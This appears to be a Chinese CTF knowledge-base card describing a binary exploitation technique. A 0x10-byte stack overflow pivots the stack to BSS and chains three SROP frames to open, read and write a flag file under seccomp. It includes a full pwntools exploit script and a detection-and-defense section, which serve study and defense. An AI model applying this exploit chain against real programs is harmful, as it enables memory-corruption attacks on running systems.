---
id: binary-pwn-stack-short-overflow-bss-pivot-3stage-srop-orw-syscall-wrapper
title: 0x10 短溢出经 BSS 栈迁移串联三段 SROP ORW：区分 syscall 包装器与裸 syscall 指令的传参布局
type: scenario
domain: binary
path: binary/pwn/stack
technique: short-overflow-bss-pivot-three-stage-srop-orw
aliases:
- 短溢出栈迁移 SROP
- 三段 SROP ORW
- syscall 包装器传参重排
- SigreturnFrame 调用 syscall 函数
- open/read/write SROP 链
- 安洵杯 pwn2 SROP
tags:
- binary
- pwn
- srop
- sigreturn
- stack-pivot
- orw
- seccomp
- syscall-wrapper
- x86-64
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V620
  verified_at: '2026-11-12T21:54:21+08:00'
  notes: 已对照原文与全部14张图核对：两段读入（BSS 0x404060/0x1000、栈 v1 0x2A+0x10 溢出）、两级 0x10 栈迁移至 BSS、0x401193 mov rax,0xf / 0x40118A 裸 syscall / 0x401060 PLT _syscall 包装器、frame.rsp 0x404198/0x4042a0、三段 open/read/write 与 seccomp 放行 rt_sigreturn、gdb 中 flag{null} 输出截图均一致；包装器寄存器重排（mov rax,rdi/mov rdi,rsi/mov rsi,rdx/mov rdx,rcx）与图04逐条吻合。dedup 判定与 ctf-pwn-signal-handler-rt-sigframe-srop-orw、binary-pwn-stack-x64-srop-sigreturn-frame-execve 为不同链（触发条件/环境/PoC 不同），dup-scan 无本卡 pair。未验证点：未本地复跑；第三帧 rsp 卡内取 0，原文完整 exp 末段为 0x404088（解析片段为 0），write 完成后 rsp 不影响 flag 输出，换题需按 gdb 重标定。例题1（2023 江西省赛 pwn2）按与既有单帧/双帧 SROP execve 卡同链跳过，判断合理。
---

## 一句话结论

当栈上只能溢出 0x10 字节、放不下一整份 sigreturn frame 时，可先用程序自带的“大块读入 BSS”把完整 payload 预置到 BSS，再用这 0x10 字节覆盖 saved rbp/返回地址做栈迁移，让 `rsp` 落到 BSS；随后用 `mov rax,0xf; ret` + `syscall` 触发 `rt_sigreturn`，由三份 `SigreturnFrame` 依次完成 `open/read/write`（seccomp 放行 `rt_sigreturn` 时仍可用）。关键坑点：若 frame 的 `rip` 指向 PLT/libc 的 `syscall` 包装器而不是裸 `syscall` 指令，必须按包装器的寄存器重排规则填写 frame（`rdi` 放系统调用号），不能照搬内核 ABI。

## 原理

- **SROP 基础**：Linux 收到信号时由内核把 `ucontext`（含全部寄存器）保存在**用户栈**上的 Signal Frame 中；signal handler 返回后执行 `rt_sigreturn`（x86-64 系统调用号 15），内核按这块用户可写内存恢复寄存器。攻击者控制栈并令 `rax=15` 后执行 `syscall`，即可一次性设定全部寄存器。
- **为什么需要栈迁移**：本题第二次 `syscall(0,0,v1,58)` 只有 58 字节，相对 `v1` 只溢出 0x10，仅够覆盖 saved rbp 与返回地址，远小于一份 frame（0xF8 字节起）。但程序前面有 `syscall(0,0,&unk_404060,4096)`，可把大段数据先读到固定 BSS 地址；把溢出后的 rbp/rip 指到 BSS，函数尾声的 `leave; ret` 就会把 `rsp` 迁到 BSS 上预置的数据，等价于把 BSS 当新栈用。
- **三段 SROP 链布局**：BSS 上每一阶段都是 `p64(mov_rax_0f_ret) + p64(syscall_insn) + bytes(frame)`。第一轮执行 `mov rax,0xf; ret` 置 `rax=15`，随后裸 `syscall` 指令触发 `rt_sigreturn`；内核恢复 frame 后跳到 frame.rip（syscall 包装器），同时把 `rsp` 设为 frame.rsp，恰好指向下一阶段的 `mov rax,0xf; ret`，包装器执行完返回时 `ret` 弹出该地址，链条继续。
- **syscall 包装器 vs 裸 syscall 指令（核心差异）**：libc/PLT 的 `syscall()` 函数遵循 C 调用约定，内部会把寄存器重排为：
  ```asm
  mov rax, rdi        ; 系统调用号来自第一个参数
  mov rdi, rsi        ; arg1
  mov rsi, rdx        ; arg2
  mov rdx, rcx        ; arg3
  mov r10, r8         ; arg4
  mov r8,  r9         ; arg5
  mov r9,  [rsp+8]    ; arg6
  syscall
  ```
  因此当 frame.rip 指向该包装器时：`frame.rdi`=系统调用号、`frame.rsi`=第 1 参数、`frame.rdx`=第 2 参数、`frame.rcx`=第 3 参数，`frame.rax` 被覆盖无需设置。例如 `open("./flag",0,0)` 要写 `rdi=2, rsi=path, rdx=0, rcx=0`；`read(3,buf,0x50)` 写 `rdi=0, rsi=3, rdx=buf, rcx=0x50`。若 frame.rip 指向裸 `syscall` 指令，则按内核 ABI：`rax`=调用号，`rdi/rsi/rdx/r10`=参数，两种布局写反会直接执行错误系统调用。
- **为什么这样能过 seccomp**：过滤器只允许 `read/write/open/rt_sigreturn/chmod/exit_group`，`rt_sigreturn` 与 ORW 都在白名单内，SROP 链不需要 `execve`，因此沙箱不构成障碍。

## 触发条件

- x86-64 ELF，存在栈溢出但可写长度很小（本例仅 0x10，只够改 saved rbp 与返回地址），无法在栈上直接放整份 frame。
- 程序另有一个“把大块攻击者数据读到固定 BSS/数据段”的原语（本例 `read(0, bss, 0x1000)`），且地址无 PIE 或已泄漏。
- 有 `mov rax,0xf; ret` 一类可置 `rax=15` 的 gadget，以及可调用的 `syscall` 指令或 `syscall` PLT 包装器。
- seccomp 放行 `rt_sigreturn` 与目标系统调用（`open/read/write` 或 `openat` 等）。
- 能通过调试确定每份 frame.rsp 精确落点（差 8 字节即会错位崩溃）。

## 利用步骤

1. 用第一段读入（BSS，0x1000 字节）预置完整 payload：`./flag` 字符串、三个阶段的 `gadget+syscall+frame` 以及对齐填充。
2. 用受限的 0x10 栈溢出覆盖 saved rbp 与返回地址，返回地址选 `leave; ret` 类尾声，rbp 指向 BSS 中的落点，使 `rsp` 迁移到 BSS；本例通过连续两次 58 字节读逐级把 rbp/rip 接力到 `0x404050+0x30+0x2a+0x10`，最后 `ret` 回程序读入函数，再从 BSS 开始执行链。
3. 阶段 1（open）：`frame.rdi=SYS_open(2)`、`frame.rsi=路径地址`、`frame.rdx=0`、`frame.rcx=0`、`frame.rip=syscall 包装器`、`frame.rsp=下一阶段 gadget 地址`。
4. 阶段 2（read）：`frame.rdi=SYS_read(0)`、`frame.rsi=3`（刚打开的 fd）、`frame.rdx=flag_buf`、`frame.rcx=0x50`、`frame.rsp=再下一阶段地址`。
5. 阶段 3（write）：`frame.rdi=SYS_write(1)`、`frame.rsi=1`、`frame.rdx=flag_buf`、`frame.rcx=0x50`、`frame.rsp=0`。
6. 用 gdb 在各 frame 恢复后核对 `rsp` 是否恰好指向下一阶段起点；确认后即可读出 flag。
7. 若采用裸 `syscall; ret` 而不是包装器，按内核 ABI 改写 frame（`rax=调用号`，`rdi/rsi/rdx/r10` 为参数），其余链条不变。

## PoC

```python
from pwn import *

context(log_level='debug', os='linux', arch='amd64')
io = process('./chall2')
elf = ELF('./chall2')

syscall_wrapper = 0x401060   # PLT _syscall -> libc syscall()
syscall_insn    = 0x40118A   # 裸 syscall 指令
rax_15          = 0x401193   # mov rax, 0xf; ret
read_main       = 0x40136e   # 再次进入读入函数
bss_file        = 0x404060   # 预置 payload 的 BSS 地址

# 1) 受限 0x10 溢出，逐级把栈迁到 BSS（偏移按具体题目调整）
io.sendafter('easyhack\n', '0')
io.sendafter('SUID?\n', b'\x00'*0x2a + p64(0x404050+0x30) + p64(0x401417))
io.send(b'\x00'*0x2a + p64(0x404050+0x30+0x2a) + p64(0x401417))
io.send(p64(0x404050+0x30+0x2a+0x10) + p64(read_main))

# 2) BSS 上预置三段 SROP 链；注意包装器要求 rdi=调用号
payload = b'./flag\x00\x00'.ljust(0x30, b'\x00')

frame = SigreturnFrame()          # open("./flag", 0, 0)
frame.rdi = constants.SYS_open    # 包装器：rdi -> rax
frame.rsi = bss_file              # 包装器：rsi -> rdi
frame.rdx = 0
frame.rcx = 0
frame.rip = syscall_wrapper
frame.rsp = 0x404198
payload += p64(rax_15) + p64(syscall_insn) + bytes(frame)

frame = SigreturnFrame()          # read(3, flag_buf, 0x50)
frame.rdi = constants.SYS_read
frame.rsi = 3
frame.rdx = elf.bss() + 0x500
frame.rcx = 0x50
frame.rip = syscall_wrapper
frame.rsp = 0x4042a0
payload += p64(rax_15) + p64(syscall_insn) + bytes(frame)

frame = SigreturnFrame()          # write(1, flag_buf, 0x50)
frame.rdi = constants.SYS_write
frame.rsi = 1
frame.rdx = elf.bss() + 0x500
frame.rcx = 0x50
frame.rip = syscall_wrapper
frame.rsp = 0
payload += p64(rax_15) + p64(syscall_insn) + bytes(frame)

io.sendafter('easyhack\n', payload)
io.send('a')
io.interactive()
```

说明：`rax_15/syscall/bss` 地址与各级 `rsp` 均为该题固定值，换题目需按实际二进制与 gdb 重新标定；`SigreturnFrame` 的 `cs` 由 pwntools 默认填 0x33。

## 变体与关联

- 单帧 `execve("/bin/sh")` 的基础形态见 [[binary-pwn-stack-x64-srop-sigreturn-frame-execve]]；本文的三段链是其“系统调用链”变体的具体化。
- seccomp 禁 `open/execve` 时可用 `mprotect`+`openat` shellcode 变体，见 [[binary-pwn-stack-srop-mprotect-openat-shellcode-seccomp]]。
- signal handler 内覆盖 `rt_sigframe` 的两阶段 ORW 变体，见 [[ctf-pwn-signal-handler-rt-sigframe-srop-orw]]。
- 32 位与 MIPS 变体分别见 [[binary-pwn-stack-32bit-srop-read-return-sigreturn]]、[[binary-pwn-stack-mips-srop-sigreturn-bss-execve]]。
- 变体：当 frame.rip 指向裸 `syscall` 指令时按内核 ABI 写 `rax=调用号, rdi/rsi/rdx/r10`；若 seccomp 禁用 `open`，改用 `openat(257)`、`openat2` 等放行调用，先 dump 过滤器确认。
- 栈迁移部分也可配合 `leave; ret`/`pop rsp` 直接跳转，本例靠多次短读接力是因为单次可写长度不足。

## 检测与防御

- 防御：栈 canary/PIE 提高溢出与地址定位成本；消除 `mov rax,0xf; ret`/`syscall` 直连 gadget；CET/Shadow Stack 阻断返回地址劫持。
- 防御：seccomp 白名单应评估 `rt_sigreturn` 的必要性，并对 `open/openat` 做参数级过滤（只允许特定路径）；仅禁 `open` 时攻击者会改用 `openat`。
- 检测：审计 `rt_sigreturn` 发生时 `rsp` 指向 BSS/数据段而非正常信号栈、frame 中 `rip` 指向 PLT `_syscall` 或 `syscall; ret` gadget、以及随后 `open→read→write` 的连续系统调用序列。
- 检测：关注进程在极小栈写入后立即发生大幅 `rsp` 变化（栈迁移）并连续触发 `rt_sigreturn` 的行为。
